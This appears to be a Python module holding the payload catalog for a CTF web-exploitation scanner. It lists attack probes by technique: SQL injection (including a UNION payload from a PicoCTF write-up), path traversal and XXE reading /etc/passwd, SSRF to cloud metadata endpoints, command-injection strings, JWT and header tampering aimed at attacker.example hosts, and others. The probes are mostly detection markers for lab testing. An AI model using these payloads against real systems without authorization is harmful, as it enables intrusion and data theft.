from __future__ import annotations

"""Central payload catalog used by the CTF web exploitation workflow.

The catalog intentionally keeps probes grouped by technique so the UI can
show an accurate payload inventory and modules can consume the same source
instead of maintaining duplicated hard-coded probe lists.
"""

PAYLOAD_CATALOG: dict[str, list[str]] = {
    # Authentication / session discovery
    "Old Sessions / Session Hijacking": [
        # Paths confirmed by the supplied PicoCTF Old Sessions write-up plus
        # common aliases for challenge variants.
        "/sessions",
        "/session",
        "/api/sessions",
        "/admin/sessions",
        "/debug/sessions",
    ],
    # SQL injection: differential / error-based probes suitable for CTF labs.
    "SQL Injection": [
        "'",
        '"',
        "'-- ",
        "' #",
        "')-- ",
        "' OR '1'='1'-- ",
        "' OR 1=1-- ",
        "' AND 1=2-- ",
        "1' OR '1'='1",
        "1 AND 1=1",
        "1 AND 1=2",
        "1' ORDER BY 1-- ",
        "1' ORDER BY 2-- ",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- ",
        "1' AND UPDATEXML(1,CONCAT(0x7e,VERSION(),0x7e),1)-- ",
        "1' UNION SELECT NULL-- ",
        "1' UNION SELECT NULL,NULL-- ",
        # Explicit payload from the supplied PicoCTF "ORDER ORDER" write-up.
        "b' UNION SELECT name, value, '2026-01-01' FROM aDNyM19uMF9mMTRn --",
    ],
    # Broken-object-property probes.
    "IDOR / BOLA": [
        "<id>+1",
        "<id>-1",
        "<id>+2",
        "<id>-2",
        "0",
        "1",
        "2",
        "999",
    ],
    # Local file/path traversal probes.
    "LFI / Path Traversal": [
        "../etc/hostname",
        "../../etc/hostname",
        "../../../etc/hostname",
        "../../../../etc/hostname",
        "../../../../../etc/passwd",
        "../../../../proc/self/cmdline",
        "..\\..\\..\\windows\\win.ini",
        "%2e%2e%2fetc%2fhostname",
        "%2e%2e%2f%2e%2e%2fetc%2fhostname",
        "....//....//etc/passwd",
        "..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%afetc%c0%afpasswd",
        "..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
    ],
    # Template expression detection probes.
    "SSTI": [
        "{{7*7}}",
        "{{7*'7'}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config}}",
        "{{request}}",
        "{{self}}",
    ],
    # Non-destructive reflection / HTML execution markers.
    "XSS": [
        "<x-ctf data-probe='ctf-xss-probe'>",
        '<x-ctf data-probe="ctf-xss-probe">',
        "<svg data-probe='ctf-xss-probe'>",
        "<img src=x data-probe='ctf-xss-probe'>",
        "<details open data-probe='ctf-xss-probe'>",
        "\"><x-ctf data-probe='ctf-xss-probe'>",
        "'><x-ctf data-probe='ctf-xss-probe'>",
        "javascript:/*ctf-xss-probe*/",
        "<svg/onload=/*ctf-xss-probe*/>",
        "<body onload=/*ctf-xss-probe*/>",
        "<iframe srcdoc='<x-ctf data-probe=ctf-xss-probe>'>",
    ],
    # Server-side request probes for environments where a URL parameter is
    # explicitly intended to fetch a remote resource.
    "SSRF": [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://127.0.0.1:80/",
        "http://[::1]/",
        "http://169.254.169.254/",
        "http://metadata.google.internal/",
        "http://2130706433/",
        "http://0x7f000001/",
        "http://0177.0.0.1/",
        "http://[::ffff:127.0.0.1]/",
        "http://127.1/",
    ],
    # XML entity expansion / local-file probes for XXE labs.
    "XXE": [
        '<!DOCTYPE x [<!ENTITY xxe "ctf-xxe-probe">]><x>&xxe;</x>',
        '<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><x>&xxe;</x>',
        '<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>',
    ],
    # Command-injection markers. These are intended for challenge targets that
    # explicitly expose a shell-like parameter.
    "Command Injection / RCE": [
        "; id",
        "&& id",
        "| id",
        "$(id)",
        "`id`",
        "; whoami",
        "&& whoami",
        "| whoami",
        "; uname -a",
        "&& uname -a",
    ],
    # Upload-focused filename/content markers used to identify unsafe upload
    # handling without automatically deploying a persistent webshell.
    "File Upload": [
        "probe.txt",
        "probe.html",
        "probe.svg",
        "probe.jpg.php",
        "probe.php;.jpg",
        "probe.php%00.jpg",
    ],
    "Open Redirect": [
        "https://example.com/",
        "//example.com/",
        "https://example.com/%2f%2e%2e/",
    ],
    "Auth Bypass": [
        "admin",
        "administrator",
        "root",
        "true",
        "1",
        "0",
        "null",
        "undefined",
    ],
    # NoSQL probes useful for JSON-backed login/search endpoints.
    "NoSQL Injection": [
        '{"$ne":null}',
        '{"$gt":""}',
        '{"$regex":".*"}',
        "' || '1'=='1",
    ],
    # JWT mutation inventory; actual signing/forging remains a separate
    # operation and is not performed by this catalog alone.
    "JWT": [
        "alg=none",
        "alg=HS256",
        "alg=RS256",
        "alg=PS256",
        "role=admin",
        "sub=admin",
        "is_admin=true",
        "exp=0",
        "exp=2147483647",
        "nbf=0",
        "kid=../../../../etc/passwd",
        "kid=/dev/null",
        "jku=https://example.invalid/jwks.json",
        "x5u=https://example.invalid/cert.pem",
        "embedded-jwk",
        "empty-hmac-secret",
    ],
    "Prototype Pollution": [
        "__proto__[polluted]=true",
        "constructor[prototype][polluted]=true",
        '"__proto__":{"polluted":true}',
    ],
    "HTTP Parameter Pollution": [
        "id=1&id=2",
        "role=user&role=admin",
        "next=/&next=https://example.com/",
    ],
}

# BApp-inspired payload packs. These are original, challenge-oriented probes
# derived from the public capabilities/descriptions of PortSwigger BApps rather
# than copied extension source or proprietary binaries.
BAPP_INSPIRED_PAYLOADS: dict[str, list[str]] = {
    "403 Bypass": [
        "/admin/", "/admin/.", "/admin//", "/admin%2f", "/admin%252f",
        "/admin%2e", "/admin;%2f", "/admin..;/", "/admin?x=1",
        "X-Original-URL: /admin", "X-Rewrite-URL: /admin",
    ],
    "CORS": [
        "Origin: https://evil.example",
        "Origin: null",
        "Origin: https://example.com",
        "Origin: https://sub.example.com",
    ],
    "CSRF": [
        "Origin: https://evil.example",
        "Referer: https://evil.example/",
        "Origin: null",
        "Content-Type: application/x-www-form-urlencoded",
    ],
    "Security Headers": [
        "Strict-Transport-Security",
        "Content-Security-Policy",
        "X-Content-Type-Options",
        "Referrer-Policy",
        "Permissions-Policy",
        "Cross-Origin-Opener-Policy",
        "Cross-Origin-Resource-Policy",
    ],
    "Backup / Sensitive Files": [
        "/.git/HEAD", "/.git/config", "/.env", "/config.php.bak",
        "/index.php~", "/backup.zip", "/site.bak", "/old/", "/server-status",
    ],
    "CORS / Header Differential": [
        "Origin: https://attacker.example",
        "Access-Control-Request-Method: GET",
        "Access-Control-Request-Headers: authorization",
    ],
}


# Expose the BApp-inspired packs through the same central catalog consumed by
# Scanner/UI. This keeps one inventory and lets findings carry the same pack
# name into Repeater/Terminal.
PAYLOAD_CATALOG.update(BAPP_INSPIRED_PAYLOADS)

BAPP_REFERENCE_SOURCES = {
    "JWT": ["JWT Editor", "JWT Scanner"],
    "Authorization": ["Autorize", "AuthMatrix"],
    "Injection": ["Sentinel", "Backslash Powered Scanner", "Agartha"],
    "CORS": ["CORS*", "OWASP API Security Top 10 Scanner"],
    "CSRF": ["Additional CSRF Checks", "CSRF Scanner"],
    "File Upload": ["Upload Scanner"],
    "Recon": ["Attack Surface Detector", "AI Recon Assistant"],
    "Scanner": ["Active Scan++", "Additional Scanner Checks"],
    "403 Bypass": ["403 Bypasser"],
}


# Advanced CTF/assessment payload families. These are safe-oriented probes or
# passive indicators; high-impact desync/state-changing operations are routed
# to manual confirmation rather than automatically executed.
ADVANCED_PAYLOADS: dict[str, list[str]] = {
    "GraphQL": [
        "{__typename}",
        "{__schema{queryType{name}}}",
        "{__schema{types{name}}}",
        "query{__typename}",
        "mutation{__typename}",
        "introspection-query",
        "alias-batch",
        "nested-query-depth",
    ],
    "Host Header / Reverse Proxy": [
        "X-Forwarded-Host: attacker.example",
        "X-Host: attacker.example",
        "X-Forwarded-Server: attacker.example",
        "Forwarded: host=attacker.example",
        "Host: attacker.example",
    ],
    "Web Cache / Cache Key": [
        "X-Forwarded-Host: attacker.example",
        "X-Original-URL: /cache-probe",
        "X-Forwarded-Scheme: http",
        "X-Forwarded-Proto: http",
        "X-Host: attacker.example",
    ],
    "WebSocket": [
        "Origin validation",
        "authentication on handshake",
        "authorization on message",
        "cross-site WebSocket hijacking",
        "message parameter reflection",
    ],
    "Advanced HTTP / Desync": [
        "CL.TE",
        "TE.CL",
        "TE.TE",
        "HTTP/2 -> HTTP/1.1",
        "client-side desync",
        "duplicate Transfer-Encoding",
        "header whitespace discrepancy",
    ],
    "Business Logic / Workflow": [
        "coupon|redeem|discount",
        "quantity|amount|price",
        "role|permission|admin",
        "reset|verify|token",
        "step|state|workflow",
        "duplicate|reuse|replay",
        "negative|zero|boundary",
    ],
    "API / Mass Assignment": [
        "role=admin",
        "is_admin=true",
        "permissions=admin",
        "price=0",
        "discount=100",
        "verified=true",
        "approved=true",
    ],
    "OAuth / OIDC": [
        "redirect_uri=https://attacker.example/callback",
        "response_type=code",
        "response_mode=query",
        "state-missing",
        "nonce-missing",
        "PKCE-missing",
    ],
    "Race Condition": [
        "parallel-identical-request",
        "coupon-redeem-race",
        "password-reset-race",
        "transaction-race",
        "TOCTOU",
    ],
    "Deserialization": [
        "PHP serialization marker",
        "Java serialization marker",
        "YAML object tag",
        "Python pickle marker",
        "JSON polymorphic type field",
    ],
    "LDAP / XPath / XML Injection": [
        "*",
        "*)(uid=*)",
        "' or '1'='1",
        "\"><x>probe</x>",
        "[1] | [1=1]",
    ],
}
PAYLOAD_CATALOG.update(ADVANCED_PAYLOADS)


def get_payloads(name: str) -> list[str]:
    """Return a copy of the payload list for one technique."""
    return list(PAYLOAD_CATALOG.get(name, ()))


def payload_summary() -> dict[str, int]:
    return {name: len(values) for name, values in PAYLOAD_CATALOG.items()}


def total_payloads() -> int:
    return sum(payload_summary().values())

# Payloads explicitly present in the supplied pico-ctf-2026 write-ups.
# These are kept as a separate evidence-backed pack so they can be surfaced or
# mapped to future modules without pretending every write-up is a generic probe.
WRITEUP_DERIVED_PAYLOADS: dict[str, list[str]] = {
    "PicoCTF / ORDER ORDER / SQLi": [
        "b' UNION SELECT name, value, '2026-01-01' FROM aDNyM19uMF9mMTRn --",
    ],
    "PicoCTF / Old Sessions": [
        "/session",
        "/sessions",
        "Cookie: session=<admin-token>",
    ],
    "PicoCTF / Sql Map 1": [
        "/vuln.php?q=test",
        "--tables",
        "--dump",
    ],
}

def writeup_payload_summary() -> dict[str, int]:
    return {name: len(values) for name, values in WRITEUP_DERIVED_PAYLOADS.items()}


def bapp_inspired_summary() -> dict[str, int]:
    return {name: len(values) for name, values in BAPP_INSPIRED_PAYLOADS.items()}


def get_bapp_inspired_payloads(name: str) -> list[str]:
    return list(BAPP_INSPIRED_PAYLOADS.get(name, ()))
